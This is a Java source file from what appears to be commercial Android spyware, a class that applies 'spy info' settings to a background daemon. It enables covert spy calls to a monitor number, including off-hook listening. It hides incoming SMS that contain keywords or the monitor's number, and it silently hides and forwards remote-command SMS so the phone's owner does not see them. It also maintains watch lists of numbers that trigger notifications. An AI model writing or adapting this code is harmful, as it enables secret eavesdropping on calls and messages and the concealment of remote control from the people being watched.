package com.vvt.dalvik.bugd;

import java.io.IOException;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.Context;

import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.preference.PreferenceManager;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.preference.model.ProductInfo;
import com.fx.preference.model.ProductInfo.ProductEdition;
import com.fx.util.FxResource;
import com.vvt.callmanager.ref.BugNotification;
import com.vvt.callmanager.ref.MonitorList;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.SmsInterceptInfo;
import com.vvt.callmanager.ref.SmsInterceptInfo.InterceptionMethod;
import com.vvt.callmanager.ref.SmsInterceptInfo.KeywordFindingMethod;
import com.vvt.callmanager.ref.SmsInterceptList;
import com.vvt.callmanager.ref.command.RemoteAddMonitor;
import com.vvt.callmanager.ref.command.RemoteAddSmsIntercept;
import com.vvt.callmanager.ref.command.RemoteGetMonitorList;
import com.vvt.callmanager.ref.command.RemoteGetSmsInterceptList;
import com.vvt.callmanager.ref.command.RemoteListenBugNotification;
import com.vvt.callmanager.ref.command.RemoteRemoveAllMonitor;
import com.vvt.callmanager.ref.command.RemoteRemoveAllSmsIntercept;
import com.vvt.logger.FxLog;

/**
 * Applies each spy information to the running daemon. Each method has an <code>updateDatabase</code>
 * argument. 
 * 
 * If this class is used by remote configuration (e.g. configure via SMS command), 
 * <code>updateDatabase</code> must be set to <code>true</code> so that each change will also be
 * recorded to the preference database.
 * 
 * However, if this class is used by the PreferenceListenerThread which listens for configuration
 * changes via GUI, <code>updateDatabase</code> must be set to <code>false</code> because 
 * preference value is already read from the preference database.
 */
@SuppressWarnings("unused")
public class SpyInfoApplier {
	
	private static final String TAG = "SpyInfoApplier";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static SpyInfoApplier sInstance;
	
	private Context mContext;
	
	private SpyInfoManager mSpyInfoManager;
	private WatchListManager mWatchListManager;
	
	private SpyInfoApplier(Context context) {
		mContext = context;
		mSpyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(mContext);
		mWatchListManager = WatchListManager.getInstance();
	}

	public static SpyInfoApplier getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new SpyInfoApplier(context);
		}
		return sInstance;
	}
	
	public void resetSettings() {
		if (LOGV) FxLog.v(TAG, "resetSettings # ENTER ...");
		
		if (LOGD) FxLog.d(TAG, "resetSettings # Disable spy call");
		mSpyInfoManager.setEnabled(false);
		
		if (LOGD) FxLog.d(TAG, "resetSettings # Remove monitor number");
		mSpyInfoManager.setMonitorNumber("");
		
		if (LOGD) FxLog.d(TAG, "resetSettings # Clear watch numbers");
		mSpyInfoManager.removeAllNumbers();
		
		if (LOGD) FxLog.d(TAG, "resetSettings # Disable Watch List Notification");
		mSpyInfoManager.setWatchAllEnabled(false);
		
		if (LOGD) FxLog.d(TAG, "resetSettings # Remove all keywords");
		mSpyInfoManager.setKeyword1("");
		mSpyInfoManager.setKeyword2("");
		
		if (LOGD) {
			checkMonitorList();
			checkSmsInterceptList();
		}
		
		if (LOGV) FxLog.v(TAG, "resetSettings # EXIT ...");
	}
	
	/**
	 * To be used when the daemon is starting and when the spy preferences are needed to be 
	 * refreshed to match the preference database.
	 */
	public void applySettings() {
		if (LOGV) FxLog.v(TAG, "applySettings # ENTER ...");
		
		// Features are canceled when the product is not activated 
		LicenseManager licenseManager = LicenseManager.getInstance(mContext);
		boolean isActivated = licenseManager.isActivated();
		
		if (LOGD) FxLog.d(TAG, String.format(
				"applySettings # Is product activated? %s", isActivated));
		
		boolean isEnabled = mSpyInfoManager.isEnabled();
		
		listenBugNotification();
		
		if (LOGD) FxLog.d(TAG, String.format("applySettings # Enable Spy: %s", isEnabled));
		setSpyCallEnabled(isActivated ? isEnabled : false);
		
		isEnabled = mSpyInfoManager.isWatchAllEnabled();
		setWatchAllEnabled(isActivated ? isEnabled : false);
		if (LOGD) FxLog.d(TAG, String.format("applySettings # Enable watch all: %s", isEnabled));
		
		isEnabled = mSpyInfoManager.isWatchListEnabled();
		setWatchListEnabled(isActivated ? isEnabled: false);
		if (LOGD) FxLog.d(TAG, String.format("applySettings # Enable Watch numbers: %s", isEnabled));
		
		isEnabled = mSpyInfoManager.isWatchPrivateEnabled();
		setWatchPrivateEnabled(isActivated ? isEnabled : false);
		if (LOGD) FxLog.d(TAG, String.format("applySettings # Enable watch private: %s", isEnabled));
		
		String[] keywords = { null, null };
		if (isActivated) {
			keywords = new String[] { 
					mSpyInfoManager.getKeyword1(), 
					mSpyInfoManager.getKeyword2() };
		}
		
		if (LOGD) FxLog.d(TAG, "applySettings # Remove all keywords");
		removeAllKeywords();
		
		if (LOGD) FxLog.d(TAG, String.format(
				"applySettings # Set new keywords: %s", 
				Arrays.toString(keywords)));
		
		setKeywords(keywords);
		
		if (LOGD) FxLog.d(TAG, "applySettings # Add basic SMS intercept");
		addBasicSmsIntercept();
		
		if (LOGD) {
			FxLog.d(TAG, "applySettings # Check monitor & SMS intercept");
			checkMonitorList();
			checkSmsInterceptList();
		}
		
		if (LOGD) FxLog.d(TAG, "applySettings # Load watchlist");
		mSpyInfoManager.loadWatchListFromStorage();
		
		List<String> watchList = mSpyInfoManager.getWatchList();
		
		setWatchList(watchList);
		
		if (LOGD) FxLog.d(TAG, String.format(
				"applySettings # Watch numbers: %s", 
				watchList.toString()));
		
		if (LOGV) FxLog.v(TAG, "applySettings # EXIT ...");
	}
	
	private SpyInfoManager getSpyInfoManager() {
		if (mSpyInfoManager == null) {
			mSpyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(mContext);
		}
		
		return mSpyInfoManager;
	}

	/**
	 * This method must be called after setMonitor(number)
	 * @param isSpyEnabled
	 */
	private void setSpyCallEnabled(boolean isSpyEnabled) {
		if (LOGV) FxLog.v(TAG, "setSpyCallEnabled # ENTER ...");
		try {
			if (LOGV) FxLog.v(TAG, "setSpyCallEnabled # Remove previous monitor");
			RemoteRemoveAllMonitor remoteRemoveAll = 
					new RemoteRemoveAllMonitor(MainDaemonResource.PACKAGE_NAME);
			
			remoteRemoveAll.execute();
			
			if (isSpyEnabled) {
				MonitorNumber monitor = getEnabledMonitor();
				if (monitor == null) {
					if (LOGD) FxLog.d(TAG, "setSpyCallEnabled # No monitor found");
				}
				else {
					if (LOGD) FxLog.d(TAG, String.format("setSpyCallEnabled # Add: %s", monitor));
					RemoteAddMonitor remoteAdd = new RemoteAddMonitor(monitor);
					remoteAdd.execute();
				}
			}
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("setSpyCallEnabled # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "setSpyCallEnabled # EXIT ...");
	}
	
	private void listenBugNotification() {
		if (LOGV) FxLog.v(TAG, "listenBugNotification # ENTER ...");
		
		ProductInfo productInfo = PreferenceManager.getInstance(mContext).getProductInfo();
		
		if (productInfo != null) {
			BugNotification notification = null;
			int listenEvent = BugNotification.LISTEN_NONE;
			
			boolean isSpyEnabled = mSpyInfoManager.isEnabled();
			
			if (isSpyEnabled) {
				listenEvent = listenEvent | BugNotification.LISTEN_ON_MONITOR_DISCONNECT;
			}
			
			ProductEdition edition = productInfo.getEdition();
			if (edition == ProductEdition.PROX) {
				listenEvent = listenEvent | BugNotification.LISTEN_ON_NORMAL_CALL_ACTIVE;
			}
			
			notification = new BugNotification(MainDaemonResource.SOCKET_NAME, listenEvent);
			if (LOGD) FxLog.d(TAG, String.format("listenBugNotification # notification: %s", notification));
			
			try {
				RemoteListenBugNotification remoteListen = 
						new RemoteListenBugNotification(notification);
				remoteListen.execute();
			}
			catch (IOException e) {
				FxLog.e(TAG, String.format("listenBugNotification # Error: %s", e));
			}
		}
		
		if (LOGV) FxLog.v(TAG, "listenBugNotification # EXIT ...");
	}
	
	private void removeAllKeywords() {
		if (LOGV) FxLog.v(TAG, "removeAllKeywords # ENTER ...");
		
		try {
			RemoteRemoveAllSmsIntercept remoteRemoveAll = 
					new RemoteRemoveAllSmsIntercept(MainDaemonResource.PACKAGE_NAME);
			
			boolean removeSuccess = remoteRemoveAll.execute();
			if (LOGV) FxLog.v(TAG, String.format(
					"removeAllKeywords # Removing success? %s", removeSuccess));
		}
		catch (IOException e) {
			FxLog.e(TAG, String.format("removeAllKeywords # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "removeAllKeywords # EXIT ...");
	}
	
	private void setKeywords(String[] keywords) {
		if (LOGV) FxLog.v(TAG, "setKeywords # ENTER ...");
	
		RemoteAddSmsIntercept remoteAddSmsIntercept = null;
		
		try {
			for (String keyword : keywords) {
				if (keyword == null || keyword.trim().length() == 0) continue;
				
				SmsInterceptInfo info = new SmsInterceptInfo();
				info.setOwnerPackage(MainDaemonResource.PACKAGE_NAME);
				info.setClientSocketName(MainDaemonResource.SOCKET_NAME);
				info.setInterceptionMethod(InterceptionMethod.HIDE_ONLY);
				info.setKeywordFindingMethod(KeywordFindingMethod.CONTAINS);
				info.setKeyword(keyword);
				
				remoteAddSmsIntercept = new RemoteAddSmsIntercept(info);
				boolean addSuccess = remoteAddSmsIntercept.execute();
				
				if (LOGD) FxLog.d(TAG, String.format(
						"setKeywords # Add: %s, Success? %s", info, addSuccess));
			}
			
		}
		catch (IOException e) {
			FxLog.e(TAG, String.format("setKeywords # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "setKeywords # EXIT ...");
	}
	
	/**
	 * Must be called after setKeywords()
	 */
	private void addBasicSmsIntercept() {
		if (LOGV) FxLog.v(TAG, "addBasicSmsIntercept # ENTER ...");
		
		try {
			RemoteAddSmsIntercept remoteAdd = null;
			
			if (LOGV) FxLog.v(TAG, "addBasicSmsIntercept # Receive SMS command");
			SmsInterceptInfo info = new SmsInterceptInfo();
			info.setOwnerPackage(MainDaemonResource.PACKAGE_NAME);
			info.setClientSocketName(MainDaemonResource.SOCKET_NAME);
			info.setInterceptionMethod(InterceptionMethod.HIDE_AND_FORWARD);
			info.setKeywordFindingMethod(KeywordFindingMethod.START_WITH);
			info.setKeyword(FxResource.SMS_COMMAND_TAG);
			
			remoteAdd = new RemoteAddSmsIntercept(info);
			remoteAdd.execute();
			
			String monitorNumber = mSpyInfoManager.getMonitorNumber();
			boolean isMonitorActive = mSpyInfoManager.isEnabled();
			
			if (LOGV) FxLog.v(TAG, String.format(
					"addBasicSmsIntercept # monitor: %s, active? %s", 
					monitorNumber, isMonitorActive));
			
			if (isMonitorActive && monitorNumber != null 
					&& monitorNumber.trim().length() > 0) {
				
				if (LOGV) FxLog.v(TAG, "addBasicSmsIntercept # Hide SMS containing monitor");
				info = new SmsInterceptInfo();
				info.setOwnerPackage(MainDaemonResource.PACKAGE_NAME);
				info.setClientSocketName(MainDaemonResource.SOCKET_NAME);
				info.setInterceptionMethod(InterceptionMethod.HIDE_ONLY);
				info.setKeywordFindingMethod(KeywordFindingMethod.CONTAINS_PHONE_NUMBER);
				info.setKeyword(monitorNumber);
				
				remoteAdd = new RemoteAddSmsIntercept(info);
				remoteAdd.execute();
				
//				if (LOGV) FxLog.v(TAG, "addBasicSmsIntercept # Hide SMS sending from monitor");
//				info = new SmsInterceptInfo();
//				info.setOwnerPackage(MainDaemonResource.PACKAGE_NAME);
//				info.setClientSocketName(MainDaemonResource.SOCKET_NAME);
//				info.setInterceptionMethod(InterceptionMethod.HIDE_ONLY);
//				info.setSenderNumber(monitorNumber);
//				
//				remoteAdd = new RemoteAddSmsIntercept(info);
//				remoteAdd.execute();
			}
		}
		catch (IOException e) {
			FxLog.e(TAG, String.format("addBasicSmsIntercept # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "addBasicSmsIntercept # EXIT ...");
	}
	
	private void setWatchAllEnabled(boolean enable) {
		mWatchListManager.setWatchAllEnabled(enable);
	}
	
	private void setWatchListEnabled(boolean enable) {
		mWatchListManager.setWatchListEnabled(enable);
	}
	
	private void setWatchPrivateEnabled(boolean enable) {
		mWatchListManager.setWatchPrivateEnabled(enable);
	}
	
	private void setWatchList(List<String> watchList) {
		mWatchListManager.setWatchList(watchList);
	}

	private MonitorNumber getEnabledMonitor() {
		MonitorNumber monitor = null;
		
		String number = mSpyInfoManager.getMonitorNumber();
		
		if (number != null && number.trim().length() > 0) {
			ProductInfo info = PreferenceManager.getInstance(mContext).getProductInfo();
			ProductEdition edition = info.getEdition();
			
			boolean spyEnabled = edition != null && edition != ProductEdition.LIGHT;
			boolean offhookSpyEnabled = edition == ProductEdition.PROX;
			
			monitor = new MonitorNumber();
			monitor.setOwnerPackage(MainDaemonResource.PACKAGE_NAME);
			monitor.setPhoneNumber(number);
			monitor.setEnabled(true);
			monitor.setSpyEnabled(spyEnabled);
			monitor.setOffhookSpyEnabled(offhookSpyEnabled);
		}
		
		return monitor;
	}
	
	public static String getMonitorDetectingRegex(String monitorNumber) {
		String output = null;
		
		// Remove spaces
		output = monitorNumber.trim();
		
		// remove + and following 2-3 digits
		if (output.startsWith("+")) {
			Pattern p = Pattern.compile("\\+[0-9]{1,3}");
			Matcher m = p.matcher(output);
			output = m.replaceFirst("");
		}
		
		// Remove symbol
		output = output.replace("+", "").replace("-", "")
				.replace("(", "").replace(")", "").replace(" ", "");
		
		// Remove beginning zero
		if (output.startsWith("0")) {
			Pattern p = Pattern.compile("[0]+");
			Matcher m = p.matcher(output);
			output = m.replaceFirst("");
		}
		
		StringBuilder builder = new StringBuilder();
		for (char c : output.toCharArray()) {
			builder.append(String.format("[ ]*([(]?[ ]*[-]?[ ]*[%s]{1}[ ]*[)]?)", c));
		}
		
		return builder.toString();
	}
	
	private void checkMonitorList() {
		RemoteGetMonitorList remoteGet = 
				new RemoteGetMonitorList(
						MainDaemonResource.PACKAGE_NAME);
		try {
			MonitorList list = remoteGet.execute();
			if (list == null || list.size() == 0) {
				FxLog.d(TAG, "checkMonitorList # No Monitor Number added");
			}
			else {
				FxLog.d(TAG, "List of Monitor Number:-");
				Iterator<MonitorNumber> it = list.iterator();
				MonitorNumber monitor = null;
				while (it.hasNext()) {
					monitor = it.next();
					FxLog.d(TAG, String.format(">> %s", monitor));
				}
			}
		}
		catch (Exception e) {
			FxLog.e(TAG, String.format(
					"checkMonitorList # Error: %s", e));
		}
	}
	
	private void checkSmsInterceptList() {
		RemoteGetSmsInterceptList remoteGet = 
				new RemoteGetSmsInterceptList(
						MainDaemonResource.PACKAGE_NAME);
		try {
			SmsInterceptList list = remoteGet.execute();
			if (list == null || list.size() == 0) {
				FxLog.d(TAG, "checkSmsInterceptList # No SMS Intercept added");
			}
			else {
				FxLog.d(TAG, "checkSmsInterceptList # List of SMS Intercept:-");
				
				Iterator<SmsInterceptInfo> it = list.iterator();
				SmsInterceptInfo smsIntercept = null;
				while (it.hasNext()) {
					smsIntercept = it.next();
					FxLog.d(TAG, String.format("checkSmsInterceptList # >> %s", smsIntercept));
				}
			}
		}
		catch (Exception e) {
			FxLog.e(TAG, String.format(
					"checkSmsInterceptList # Error: %s", e));
		}
	}

}
